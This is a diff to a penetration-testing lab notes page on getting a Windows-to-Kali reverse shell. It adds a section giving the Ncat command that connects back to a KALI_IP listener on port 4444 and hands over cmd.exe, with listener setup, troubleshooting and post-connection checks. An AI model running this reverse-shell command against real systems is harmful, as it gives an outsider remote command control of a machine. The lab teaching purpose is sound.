@@ -7,7 +7,37 @@ boost: 10
 hideFooterPagination: true
 ---
 
+import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+
 {/* Generated from Commands/windows-reverse-shell.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+
+## Current operation: Receive a Windows Ncat command session
+
+**Run in:** Windows cmd.exe. **Requires:** A Windows Ncat build supporting -e already on the lab host, a Kali ncat -lvnp 4444 listener and permitted outbound connectivity.
+
+```console
+ncat.exe KALI_IP 4444 -e cmd.exe
+```
+
+**Read the result:** Match platform, architecture, callback address and listener protocol, then verify the received process identity.
+
+**If The listener receives a connection but no usable command prompt:** A TCP connection is not automatically a working shell; command quoting, process lifetime and egress can each break the chain.
+
+**Next check:** Verify the selected executable and command processor, then run whoami and hostname; this stream does not provide a full Windows console.
+
+**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
+
+### Reviewed operation documentation
+
+- [Primary reference 1](https://nmap.org/ncat/guide/ncat-exec.html)
+
+## Preserved earlier notes
+
+<PreservedNotes>
+
+Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
 
 ## Windows → Kali reverse shell: choose the operation and read the result
 
@@ -104,3 +134,5 @@ Replace &lt;ATTACKER_IP> with your reachable Kali/VPN address. This exact wrappe
 - [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
+
+</PreservedNotes>
